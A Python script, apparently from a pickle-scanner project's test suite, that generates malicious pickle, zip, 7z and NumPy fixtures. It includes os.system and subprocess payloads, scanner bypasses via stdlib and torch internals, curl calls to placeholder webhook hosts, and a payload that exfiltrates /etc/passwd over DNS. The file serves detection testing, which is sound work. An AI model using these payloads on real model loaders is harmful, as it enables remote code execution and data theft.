import bdb
import cProfile
import http.client
import io
import pathlib
import pickle
import pip
import pydoc
import os
import socket
import subprocess
import sys
import venv
import zipfile
from code import InteractiveInterpreter
from doctest import debug_script
from functools import partial
from profile import Profile
from trace import Trace
from typing import Callable, Any

_root_path = os.path.dirname(__file__)


class Malicious1:
    def __reduce__(self):
        return eval, ("print('456')",)


class Malicious2:
    def __reduce__(self):
        return os.system, ("ls -la",)


class Malicious3:
    def __reduce__(self):
        return http.client.HTTPSConnection, ("github.com",)


class Malicious4:
    def __reduce__(self):
        import requests

        return requests.get, ("https://github.com",)


class Malicious5:
    def __reduce__(self):
        import aiohttp

        return aiohttp.ClientSession, tuple()


class Malicious6:
    def __reduce__(self):
        return socket.create_connection, (("github.com", 80),)


class Malicious7:
    def __reduce__(self):
        return subprocess.run, (["ls", "-l"],)


class Malicious8:
    def __reduce__(self):
        return sys.exit, (0,)


class Malicious13:
    def __reduce__(self):
        return pickle.loads, (b"I12345\n.",)  # Loads the value 12345


class Malicious14:
    def __reduce__(self):
        import runpy

        return runpy._run_code, ("print('456')",)


class Malicious15:
    def __reduce__(self):
        bd = bdb.Bdb()
        return bdb.Bdb.run, (
            bd,
            'import os\nos.system("whoami")',
        )


class Malicious16:
    def __reduce__(self):
        return pip.main, (
            [
                "install",
                "some_malicious_package",
                "--no-input",
                "-q",
                "-q",
                "-q",
                "--exists-action",
                "i",
                "--isolated",
            ],
        )


class Malicious17:
    def __reduce__(self):
        import torch._inductor.codecache as codecache

        return codecache.compile_file, ("", "", ["sh", "-c", '$(echo "pwned")'])


class Malicious18:
    def __reduce__(self):
        return pydoc.pipepager, ("", 'echo "pwned"')


class Malicious19:
    def __init__(self, path, **kwargs):
        self.path = path
        self.kwargs = kwargs

    def __reduce__(self):
        import torch

        return partial(torch.load, self.path, **self.kwargs), ()


class Malicious20:
    def __reduce__(self):
        return venv.create, ("venv", False, False, True, False, "$(echo pwned)")


class Malicious21:
    def __reduce__(self):
        import timeit

        return timeit.timeit, (
            "",
            'import os; os.system("curl https://webhook.invalid/1234")',
        )


class Malicious22:
    def __reduce__(self):
        from numpy.testing._private.utils import runstring

        return runstring, ("import os; os.system('curl https://example.invalid')", {})


_payload = "__import__('os').system('whoami')"


def reduce_GHSA_4r9r_ch6f_vxmx():
    import torch.utils.bottleneck.__main__ as bottleneck_main

    return bottleneck_main.run_cprofile, (_payload, {})


def reduce_GHSA_86cj_95qr_2p4f():
    import torch._dynamo.guards as guards

    return guards.GuardBuilder.get, ({}, _payload)


def reduce_GHSA_f4x7_rfwp_v3xw():
    import torch.fx.experimental.symbolic_shapes as symbolic_shapes

    return symbolic_shapes.ShapeEnv.evaluate_guards_expression, ({}, _payload, [])


def reduce_GHSA_f745_w6jp_hpxx():
    import torch.utils.collect_env as collect_env

    return collect_env.run, (_payload,)


def reduce_GHSA_jhph_76pp_mggw():
    import torch.utils.collect_env as collect_env

    return collect_env.run_and_read_all, (collect_env.run, _payload)


def reduce_GHSA_h3qp_7fh3_f8h4():
    import torch.utils.data.datapipes.utils.decoder as decoder

    return decoder.basichandlers, ("pickle", b"")


def reduce_GHSA_vr7h_p6mm_wpmh():
    import torch.jit.unsupported_tensor_ops as unsupported_tensor_ops

    return unsupported_tensor_ops.execWrapper, (_payload, {}, {})


def reduce_GHSA_vv6j_3g6g_2pvj():
    from torch.utils._config_module import ConfigModule

    return ConfigModule.load_config, ({}, b"")


def reduce_GHSA_5qwp_399c_mjwf():
    return Trace.run, ({}, _payload)


def reduce_GHSA_g344_hcph_8vgg():
    return Trace.runctx, ({}, _payload, {}, {})


def reduce_GHSA_x696_vm39_cp64():
    return Profile.run, ({}, _payload)


def reduce_GHSA_6vqj_c2q5_j97w():
    return Profile.runctx, ({}, _payload, {}, {})


def reduce_GHSA_f54q_57x4_jg88():
    from lib2to3.pgen2.grammar import Grammar

    return Grammar.loads, ({}, b"")


def reduce_GHSA_3vg9_h568_4w9m():
    from idlelib.debugobj import ObjectTreeItem

    return ObjectTreeItem.SetText, ({}, _payload)


def reduce_GHSA_6w4w_5w54_rjvr():
    from idlelib.autocomplete import AutoComplete

    return AutoComplete.get_entity, ({}, _payload)


def reduce_GHSA_7cq8_mj8x_j263():
    from idlelib.autocomplete import AutoComplete, ATTRS

    return AutoComplete.fetch_completions, ({}, _payload, ATTRS)


def reduce_GHSA_cj3c_v495_4xqh():
    return InteractiveInterpreter.runcode, ({}, _payload)


def reduce_GHSA_8r4j_24qv_fmq9():
    from idlelib.calltip import Calltip

    return Calltip.fetch_tip, ({}, _payload)


def reduce_GHSA_9xph_j2h6_g47v():
    from idlelib.calltip import get_entity

    return get_entity, (_payload,)


def reduce_GHSA_4whj_rm5r_c2v8():
    import torch.utils.bottleneck.__main__ as bottleneck_main

    return bottleneck_main.run_autograd_prof, (_payload, {})


def reduce_GHSA_xp4f_hrf8_rxw7():
    from ensurepip import _run_pip

    return _run_pip, (_payload,)


def reduce_GHSA_p9w7_82w4_7q8m():
    from lib2to3.pgen2.pgen import ParserGenerator

    return ParserGenerator.make_label, (None, {}, '""+' + _payload)


def reduce_GHSA_m869_42cg_3xwr():
    from idlelib.run import Executive

    return Executive.runcode, ({}, _payload)


def reduce_GHSA_j343_8v2j_ff7w():
    from idlelib.pyshell import ModifiedInterpreter

    return ModifiedInterpreter.runcommand, ({}, _payload)


def reduce_GHSA_3gf5_cxq9_w223():
    from idlelib.pyshell import ModifiedInterpreter

    return ModifiedInterpreter.runcode, ({}, _payload)


def reduce_GHSA_fqq6_7vqf_w3fg():
    return debug_script, (_payload, True)


def reduce_GHSA_9w88_8rmg_7g2p():
    return cProfile.runctx, (_payload, None, None)


def reduce_GHSA_49gj_c84q_6qm9():
    return cProfile.run, (_payload,)


def reduce_GHSA_q77w_mwjj_7mqx():
    if sys.platform == "win32":
        sys.platform = "mock"
    from asyncio.unix_events import _UnixSubprocessTransport

    return _UnixSubprocessTransport._start, ({}, "whoami", True, None, None, None, 0)


def reduce_GHSA_m273_6v24_x4m4():
    import distutils.file_util

    return distutils.file_util.write_file, ("pwned_config.env", ["malicious content"])


def initialize_pickle_file(path: str, obj: Any, version: int):
    if os.path.exists(path):
        print(f"File {path} already exists, skipping initialization.")
        return

    with open(path, "wb") as file:
        pickle.dump(obj, file, protocol=version)
    print(f"Initialized file {path}.")


def initialize_pickle_file_from_reduce(filename: str, reduce: Callable[[], tuple], version: int = 4):
    path = f"{_root_path}/data2/{filename}"
    if os.path.exists(path):
        print(f"File {path} already exists, skipping initialization.")
        return

    class Reduce:
        def __reduce__(self):
            return reduce()

    with open(path, "wb") as file:
        pickle.dump(Reduce(), file, protocol=version)
    print(f"Initialized file {path}.")


def initialize_data_file(path: str, data: bytes):
    if os.path.exists(path):
        print(f"File {path} already exists, skipping initialization.")
        return

    with open(path, "wb") as file:
        file.write(data)
    print(f"Initialized file {path}.")


def initialize_7z_file(archive_path: str, file_name: str):
    if os.path.exists(archive_path):
        print(f"File {archive_path} already exists, skipping initialization.")
        return

    file_path = f"{_root_path}/data/malicious1.pkl"
    with open(file_path, "wb") as f:
        pickle.dump(Malicious1(), f, protocol=4)

    import py7zr

    with py7zr.SevenZipFile(archive_path, "w") as archive:
        archive.write(file_path, file_name)
    print(f"Initialized file {archive_path}.")

    pathlib.Path.unlink(pathlib.Path(file_path))


def initialize_zip_file(path: str, file_name: str, data: bytes):
    if os.path.exists(path):
        print(f"File {path} already exists, skipping initialization.")
        return

    with zipfile.ZipFile(path, "w") as zip:
        zip.writestr(file_name, data)
    print(f"Initialized file {path}.")


def initialize_corrupt_zip_file_central_directory(path: str, file_name: str, data: bytes):
    if os.path.exists(path):
        print(f"File {path} already exists, skipping initialization.")
        return

    with zipfile.ZipFile(path, "w") as zip:
        zip.writestr(file_name, data)

    with open(path, "rb") as f:
        data = f.read()

    # Replace only the first occurrence of "data.pkl" with "datap.kl"
    modified_data = data.replace(b"data.pkl", b"datap.kl", 1)

    # Write back the modified content
    with open(path, "wb") as f:
        f.write(modified_data)
    print(f"Initialized file {path}.")


def initialize_corrupt_zip_file_crc(path: str, file_name: str, data: bytes):
    if os.path.exists(path):
        print(f"File {path} already exists, skipping initialization.")
        return

    with io.BytesIO() as buffer:
        with zipfile.ZipFile(buffer, "w") as zip:
            zip.writestr(file_name, data)
        data = buffer.getbuffer().tobytes()

    # Corrupt the data, leading to a CRC mismatch
    modified_data = data.replace(b"print('456')", b"print('123')", 1)

    # Write the corrupted content
    with open(path, "wb") as f:
        f.write(modified_data)
    print(f"Initialized file {path}.")


def initialize_pickle_files():
    os.makedirs(f"{_root_path}/data", exist_ok=True)

    # Test with Pickle versions 0, 3, and 4:
    # - Pickle versions 0, 1, 2 have built-in functions under '__builtin__' while versions 3 and 4 have them under 'builtins'
    # - Pickle versions 0, 1, 2, 3 use 'GLOBAL' opcode while 4 uses 'STACK_GLOBAL' opcode
    for version in (0, 3, 4):
        initialize_pickle_file(f"{_root_path}/data/benign0_v{version}.pkl", ["a", "b", "c"], version)
        initialize_pickle_file(f"{_root_path}/data/malicious1_v{version}.pkl", Malicious1(), version)
        initialize_pickle_file(f"{_root_path}/data/malicious2_v{version}.pkl", Malicious2(), version)

    # Malicious Pickle from https://sensepost.com/cms/resources/conferences/2011/sour_pickles/BH_US_11_Slaviero_Sour_Pickles.pdf
    initialize_data_file(
        f"{_root_path}/data/malicious0.pkl",
        b'c__builtin__\nglobals\n(tRp100\n0c__builtin__\ncompile\n(S\'fl=open("/etc/passwd");picklesmashed=fl.read();'
        + b"'\nS''\nS'exec'\ntRp101\n0c__builtin__\neval\n(g101\ng100\ntRp102\n0c__builtin__\ngetattr\n(c__builtin__\n"
        + b"dict\nS'get'\ntRp103\n0c__builtin__\napply\n(g103\n(g100\nS'picklesmashed'\nltRp104\n0g104\n.",
    )

    # Malicious Pickle with an INST opcode
    #     0: (    MARK
    #     1: S        STRING     'raise RuntimeError("Injection running")'
    #    44: i        INST       '__builtin__ exec' (MARK at 0)
    #    62: .    STOP
    initialize_data_file(
        f"{_root_path}/data/malicious10.pkl",
        b"(S'raise RuntimeError(\"Injection running\")'\ni__builtin__\nexec\n.",
    )

    # Malicious Pickle from Capture-the-Flag challenge 'Misc/Safe Pickle' at https://imaginaryctf.org/Challenges
    # GitHub Issue: https://github.com/mmaitre314/picklescan/issues/22
    initialize_data_file(
        f"{_root_path}/data/malicious11.pkl",
        b"".join(
            [
                pickle.UNICODE + b"os\n",
                pickle.PUT + b"2\n",
                pickle.POP,
                pickle.UNICODE + b"system\n",
                pickle.PUT + b"3\n",
                pickle.POP,
                pickle.UNICODE + b"torch\n",
                pickle.PUT + b"0\n",
                pickle.POP,
                pickle.UNICODE + b"LongStorage\n",
                pickle.PUT + b"1\n",
                pickle.POP,
                pickle.GET + b"2\n",
                pickle.GET + b"3\n",
                pickle.STACK_GLOBAL,
                pickle.MARK,
                pickle.UNICODE + b"cat flag.txt\n",
                pickle.TUPLE,
                pickle.REDUCE,
                pickle.STOP,
            ]
        ),
    )

    initialize_data_file(
        f"{_root_path}/data/malicious-invalid-bytes.pkl",
        b"".join(
            [
                pickle.UNICODE + b"os\n",
                pickle.PUT + b"2\n",
                pickle.POP,
                pickle.UNICODE + b"system\n",
                pickle.PUT + b"3\n",
                pickle.POP,
                pickle.UNICODE + b"torch\n",
                pickle.PUT + b"0\n",
                pickle.POP,
                pickle.UNICODE + b"LongStorage\n",
                pickle.PUT + b"1\n",
                pickle.POP,
                pickle.GET + b"2\n",
                pickle.GET + b"3\n",
                pickle.STACK_GLOBAL,
                pickle.MARK,
                pickle.UNICODE + b"cat flag.txt\n",
                pickle.TUPLE,
                pickle.REDUCE,
                pickle.STOP,
                b"\n\n\t\t",
            ]
        ),
    )

    initialize_data_file(
        f"{_root_path}/data2/keyerror-exploit.pkl",
        b"".join(
            [
                pickle.PROTO,
                b"\x04",  # Protocol >= 4 (required for STACK_GLOBAL)
                # Add dangerous import with verifiable side effects
                pickle.GLOBAL,
                b"os\nsystem\n",
                pickle.UNICODE,
                b'echo "pwned by memo keyerror"\n',
                pickle.TUPLE1,
                pickle.REDUCE,
                pickle.POP,
                # Store something in memo[0] to make the pickle more realistic
                pickle.SHORT_BINUNICODE,
                b"\x02os",
                pickle.MEMOIZE,  # Store "os" in memo[0]
                # Try to use STACK_GLOBAL with non-existent memo key
                pickle.BINGET,
                b"\x03",  # Try to retrieve memo[3] (doesn't exist!)
                pickle.BINGET,
                b"\x00",  # Retrieve memo[0] ("os")
                pickle.STACK_GLOBAL,  # This will cause KeyError: 3
                # Add some benign data to complete the pickle
                pickle.BININT1,
                b"\x42",
                pickle.STOP,
            ]
        ),
    )

    initialize_data_file(
        f"{_root_path}/data2/type-confusion-exploit.pkl",
        b"".join(
            [
                pickle.PROTO,
                b"\x04",  # Protocol >= 4 (required for STACK_GLOBAL)
                # Add dangerous import with verifiable side effects
                pickle.GLOBAL,
                b"os\nsystem\n",
                pickle.UNICODE,
                b'echo "type-confusion-exploit"\n',
                pickle.TUPLE1,
                pickle.REDUCE,
                pickle.POP,
                # Store integer in memo to cause type confusion
                pickle.BININT,
                b"\x2a\x00\x00\x00",  # Push integer 42
                pickle.MEMOIZE,  # Store 42 in memo[0]
                # Store string in memo
                pickle.SHORT_BINUNICODE,
                b"\x02os",  # Push "os"
                pickle.MEMOIZE,  # Store "os" in memo[1]
                # Use STACK_GLOBAL with type-confused values
                pickle.BINGET,
                b"\x00",  # Retrieve memo[0] (integer 42)
                pickle.BINGET,
                b"\x01",  # Retrieve memo[1] ("os")
                pickle.STACK_GLOBAL,  # Try to construct global from (42, "os")
                # Complete the pickle
                pickle.BININT1,
                b"\x42",
                pickle.STOP,
            ]
        ),
    )

    # Broken model
    initialize_data_file(
        f"{_root_path}/data/broken_model.pkl",
        b"cbuiltins\nexec\n(X>\nf = open('my_file.txt', 'a'); f.write('Malicious'); f.close()tRX.",
    )

    # Code which created malicious12.pkl using pickleassem (see https://github.com/gousaiyang/pickleassem)
    #
    # p = PickleAssembler(proto=4)
    #
    # # get operator.attrgetter onto stack
    # p.push_short_binunicode("operator")
    # p.memo_memoize()
    # p.push_short_binunicode("attrgetter")
    # p.memo_memoize()
    # p.build_stack_global()
    # p.memo_memoize()
    #
    # # get operator.attrgetter("system") onto stack
    # p.push_short_binunicode("system")
    # p.memo_memoize()
    # p.build_tuple1()
    # p.memo_memoize()
    # p.build_reduce()
    # p.memo_memoize()
    #
    # # get os module onto stack
    # p.push_short_binunicode("builtins")
    # p.memo_memoize()
    # p.push_short_binunicode("__import__")
    # p.memo_memoize()
    # p.build_stack_global()
    # p.memo_memoize()
    # p.push_short_binunicode("os")
    # p.memo_memoize()
    # p.build_tuple1()
    # p.memo_memoize()
    # p.build_reduce()
    # p.memo_memoize()
    #
    # # get os.system onto stack
    # p.build_tuple1()
    # p.memo_memoize()
    # p.build_reduce()
    # p.memo_memoize()
    #
    # # call os.system("echo pwned")
    # p.push_short_binunicode("echo pwned")
    # p.memo_memoize()
    # p.build_tuple1()
    # p.memo_memoize()
    # p.build_reduce()
    # p.memo_memoize()

    initialize_data_file(f"{_root_path}/data/malicious3.pkl", pickle.dumps(Malicious3(), protocol=0))
    initialize_pickle_file(f"{_root_path}/data/malicious4.pickle", Malicious4(), 4)
    initialize_pickle_file(f"{_root_path}/data/malicious5.pickle", Malicious5(), 4)
    initialize_data_file(
        f"{_root_path}/data/malicious6.pkl",
        pickle.dumps(["a", "b", "c"]) + pickle.dumps(Malicious4()),
    )
    initialize_pickle_file(f"{_root_path}/data/malicious7.pkl", Malicious6(), 4)
    initialize_pickle_file(f"{_root_path}/data/malicious8.pkl", Malicious7(), 4)
    initialize_pickle_file(f"{_root_path}/data/malicious9.pkl", Malicious8(), 4)
    initialize_pickle_file(f"{_root_path}/data/malicious13a.pkl", Malicious13(), 0)  # pickle module serialized as cpickle
    initialize_pickle_file(f"{_root_path}/data/malicious13b.pkl", Malicious13(), 4)  # pickle module serialized as _pickle
    initialize_pickle_file(f"{_root_path}/data/malicious14.pkl", Malicious14(), 4)  # runpy
    initialize_pickle_file(f"{_root_path}/data/malicious15a.pkl", Malicious15(), 2)
    initialize_pickle_file(f"{_root_path}/data/malicious15b.pkl", Malicious15(), 4)
    initialize_pickle_file(f"{_root_path}/data/malicious16.pkl", Malicious16(), 0)

    initialize_pickle_file(f"{_root_path}/data/malicious17.pkl", Malicious17(), 4)
    initialize_pickle_file(f"{_root_path}/data/malicious18.pkl", Malicious18(), 4)

    # This exploit serializes kwargs and passes them into a torch.load call
    initialize_pickle_file(
        f"{_root_path}/data/malicious19.pkl",
        Malicious19("some_other_model.bin", pickle_file="config.json", weights_only=False),
        4,
    )

    initialize_pickle_file(f"{_root_path}/data/malicious20.pkl", Malicious20(), 4)
    initialize_7z_file(
        f"{_root_path}/data/malicious1.7z",
        "data.pkl",
    )

    initialize_zip_file(
        f"{_root_path}/data/malicious1.zip",
        "data.pkl",
        pickle.dumps(Malicious1(), protocol=4),
    )

    initialize_corrupt_zip_file_central_directory(
        f"{_root_path}/data/malicious1_central_directory.zip",
        "data.pkl",
        pickle.dumps(Malicious1(), protocol=4),
    )

    initialize_corrupt_zip_file_crc(
        f"{_root_path}/data2/malicious1_crc.zip",
        "data.pkl",
        pickle.dumps(Malicious1(), protocol=4),
    )

    initialize_zip_file(
        f"{_root_path}/data/malicious1_wrong_ext.zip",
        "data.txt",  # Pickle file with a non-standard extension
        pickle.dumps(Malicious1(), protocol=4),
    )

    # Fake PyTorch file (PNG file format) simulating https://huggingface.co/RectalWorm/loras_new/blob/main/Owl_Mage_no_background.pt
    initialize_data_file(f"{_root_path}/data/bad_pytorch.pt", b"\211PNG\r\n\032\n")

    initialize_pickle_file(f"{_root_path}/data2/malicious21.pkl", Malicious21(), 4)
    initialize_pickle_file(f"{_root_path}/data2/malicious22.pkl", Malicious22(), 4)

    # https://github.com/mmaitre314/picklescan/security/advisories/GHSA-9gvj-pp9x-gcfr
    initialize_data_file(
        f"{_root_path}/data2/malicious23.pkl",
        b"".join(
            [
                pickle.STRING + b"'os'\n",
                pickle.STRING + b"'system'\n",
                pickle.STACK_GLOBAL,
                pickle.STRING + b"'ls'\n",
                pickle.TUPLE1,
                pickle.REDUCE,
                pickle.STOP,
            ]
        ),
    )

    initialize_pickle_file_from_reduce("GHSA-4r9r-ch6f-vxmx.pkl", reduce_GHSA_4r9r_ch6f_vxmx)
    initialize_pickle_file_from_reduce("GHSA-86cj-95qr-2p4f.pkl", reduce_GHSA_86cj_95qr_2p4f)
    initialize_pickle_file_from_reduce("GHSA-f4x7-rfwp-v3xw.pkl", reduce_GHSA_f4x7_rfwp_v3xw)
    initialize_pickle_file_from_reduce("GHSA-f745-w6jp-hpxx.pkl", reduce_GHSA_f745_w6jp_hpxx)
    initialize_pickle_file_from_reduce("GHSA-jhph-76pp-mggw.pkl", reduce_GHSA_jhph_76pp_mggw)
    initialize_pickle_file_from_reduce("GHSA-h3qp-7fh3-f8h4.pkl", reduce_GHSA_h3qp_7fh3_f8h4)
    initialize_pickle_file_from_reduce("GHSA-vr7h-p6mm-wpmh.pkl", reduce_GHSA_vr7h_p6mm_wpmh)
    initialize_pickle_file_from_reduce("GHSA-vv6j-3g6g-2pvj.pkl", reduce_GHSA_vv6j_3g6g_2pvj)
    initialize_pickle_file_from_reduce("GHSA-5qwp-399c-mjwf.pkl", reduce_GHSA_5qwp_399c_mjwf)
    initialize_pickle_file_from_reduce("GHSA-g344-hcph-8vgg.pkl", reduce_GHSA_g344_hcph_8vgg)
    initialize_pickle_file_from_reduce("GHSA-x696-vm39-cp64.pkl", reduce_GHSA_x696_vm39_cp64)
    initialize_pickle_file_from_reduce("GHSA-6vqj-c2q5-j97w.pkl", reduce_GHSA_6vqj_c2q5_j97w)
    initialize_pickle_file_from_reduce("GHSA-f54q-57x4-jg88.pkl", reduce_GHSA_f54q_57x4_jg88)
    initialize_pickle_file_from_reduce("GHSA-3vg9-h568-4w9m.pkl", reduce_GHSA_3vg9_h568_4w9m)
    initialize_pickle_file_from_reduce("GHSA-6w4w-5w54-rjvr.pkl", reduce_GHSA_6w4w_5w54_rjvr)
    initialize_pickle_file_from_reduce("GHSA-7cq8-mj8x-j263.pkl", reduce_GHSA_7cq8_mj8x_j263)
    initialize_pickle_file_from_reduce("GHSA-cj3c-v495-4xqh.pkl", reduce_GHSA_cj3c_v495_4xqh)
    initialize_pickle_file_from_reduce("GHSA-8r4j-24qv-fmq9.pkl", reduce_GHSA_8r4j_24qv_fmq9)
    initialize_pickle_file_from_reduce("GHSA-9xph-j2h6-g47v.pkl", reduce_GHSA_9xph_j2h6_g47v)
    initialize_pickle_file_from_reduce("GHSA-4whj-rm5r-c2v8.pkl", reduce_GHSA_4whj_rm5r_c2v8)
    initialize_pickle_file_from_reduce("GHSA-xp4f-hrf8-rxw7.pkl", reduce_GHSA_xp4f_hrf8_rxw7)
    initialize_pickle_file_from_reduce("GHSA-p9w7-82w4-7q8m.pkl", reduce_GHSA_p9w7_82w4_7q8m)
    initialize_pickle_file_from_reduce("GHSA-m869-42cg-3xwr.pkl", reduce_GHSA_m869_42cg_3xwr)
    initialize_pickle_file_from_reduce("GHSA-j343-8v2j-ff7w.pkl", reduce_GHSA_j343_8v2j_ff7w)
    initialize_pickle_file_from_reduce("GHSA-3gf5-cxq9-w223.pkl", reduce_GHSA_3gf5_cxq9_w223)
    initialize_pickle_file_from_reduce("GHSA-fqq6-7vqf-w3fg.pkl", reduce_GHSA_fqq6_7vqf_w3fg)
    initialize_pickle_file_from_reduce("GHSA-9w88-8rmg-7g2p.pkl", reduce_GHSA_9w88_8rmg_7g2p)
    initialize_pickle_file_from_reduce("GHSA-49gj-c84q-6qm9.pkl", reduce_GHSA_49gj_c84q_6qm9)
    initialize_pickle_file_from_reduce("GHSA-q77w-mwjj-7mqx.pkl", reduce_GHSA_q77w_mwjj_7mqx)
    initialize_pickle_file_from_reduce("GHSA-jgw4-cr84-mqxg.bin", reduce_GHSA_q77w_mwjj_7mqx)
    initialize_pickle_file_from_reduce("GHSA-m273-6v24-x4m4.pkl", reduce_GHSA_m273_6v24_x4m4)


def initialize_numpy_files():
    import numpy as np

    os.makedirs(f"{_root_path}/data2", exist_ok=True)

    path = f"{_root_path}/data2/object_array.npy"
    if not os.path.exists(path):
        x = np.empty((2, 2), dtype=object)
        x[:] = [(1, 2), (3, 4)]
        np.save(path, x)

    path = f"{_root_path}/data2/int_array.npy"
    if not os.path.exists(path):
        x = np.empty((2, 2), dtype=int)
        x[:] = [(1, 2), (3, 4)]
        np.save(path, x)

    path = f"{_root_path}/data2/object_arrays.npz"
    if not os.path.exists(path):
        np.savez(
            path,
            a=np.array([0, 1, 2], dtype=object),
            b=np.array([3, 4, 5], dtype=object),
        )

    path = f"{_root_path}/data2/int_arrays.npz"
    if not os.path.exists(path):
        np.savez(path, a=np.array([0, 1, 2], dtype=int), b=np.array([3, 4, 5], dtype=int))

    path = f"{_root_path}/data2/object_arrays_compressed.npz"
    if not os.path.exists(path):
        np.savez_compressed(
            path,
            a=np.array([0, 1, 2], dtype=object),
            b=np.array([3, 4, 5], dtype=object),
        )

    path = f"{_root_path}/data2/int_arrays_compressed.npz"
    if not os.path.exists(path):
        np.savez_compressed(path, a=np.array([0, 1, 2], dtype=int), b=np.array([3, 4, 5], dtype=int))

    path = f"{_root_path}/data2/dns_exfiltration.npy"
    if not os.path.exists(path):

        class DNSLogPayload:
            def __reduce__(self):
                # Step 1: read a line from /etc/passwd
                linecache = __import__("linecache")
                first_line = linecache.getline("/etc/passwd", 1).strip()

                # Step 2: Sanitize and embed it as a DNS subdomain
                subdomain = first_line.replace(":", "_").replace("/", "_")
                fqdn = f"{subdomain}.dns-logger.invalid"

                # Step 3: Use ssl.get_server_certificate to trigger DNS resolution
                ssl_mod = __import__("ssl")
                return (getattr(ssl_mod, "get_server_certificate"), ((fqdn, 443),))

        # To load attack: np.load("dns_exfiltration.npy", encoding="latin1", fix_imports=True, allow_pickle=True)
        np.save(path, np.array([DNSLogPayload()], dtype=object), allow_pickle=True)


if __name__ == "__main__":
    initialize_pickle_files()
    initialize_numpy_files()
